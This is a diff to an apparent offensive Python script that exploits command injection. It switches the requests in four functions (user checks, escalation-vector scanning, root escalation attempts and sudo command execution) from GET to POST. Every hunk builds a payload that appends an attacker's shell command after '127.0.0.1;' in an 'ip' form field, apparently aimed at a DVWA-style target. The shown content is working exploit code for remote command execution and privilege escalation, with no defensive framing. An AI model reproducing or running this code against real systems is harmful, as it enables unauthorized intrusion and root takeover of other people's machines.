@@ -135,9 +135,9 @@ def check_current_user(session, cmdi_url, results, delay):
 
         try:
             payload = f"127.0.0.1; {cmd}"
-            params = {'ip': payload, 'Submit': 'Submit'}
+            data = {'ip': payload, 'Submit': 'Submit'}
 
-            response = session.session.get(cmdi_url, params=params)
+            response = session.session.post(cmdi_url, data=data)
             output = extract_command_output(response.text)
 
             if output:
@@ -173,9 +173,9 @@ def scan_escalation_vectors(session, cmdi_url, results, delay):
 
             try:
                 payload = f"127.0.0.1; {cmd}"
-                params = {'ip': payload, 'Submit': 'Submit'}
+                data = {'ip': payload, 'Submit': 'Submit'}
 
-                response = session.session.get(cmdi_url, params=params)
+                response = session.session.post(cmdi_url, data=data)
                 output = extract_command_output(response.text)
 
                 if output and len(output) > 5:
@@ -224,9 +224,9 @@ def attempt_root_escalation(session, cmdi_url, results, delay):
             print(f"    [*] {attempt['name']}...")
 
             payload = f"127.0.0.1; {attempt['command']}"
-            params = {'ip': payload, 'Submit': 'Submit'}
+            data = {'ip': payload, 'Submit': 'Submit'}
 
-            response = session.session.get(cmdi_url, params=params)
+            response = session.session.post(cmdi_url, data=data)
             output = extract_command_output(response.text)
 
             if output and attempt['success_indicator'] in output.lower():
@@ -277,9 +277,9 @@ def exploit_root_access(session, cmdi_url, results, delay):
 
         try:
             payload = f"127.0.0.1; sudo {cmd}"
-            params = {'ip': payload, 'Submit': 'Submit'}
+            data = {'ip': payload, 'Submit': 'Submit'}
 
-            response = session.session.get(cmdi_url, params=params)
+            response = session.session.post(cmdi_url, data=data)
             output = extract_command_output(response.text)
 
             if output and len(output) > 10:
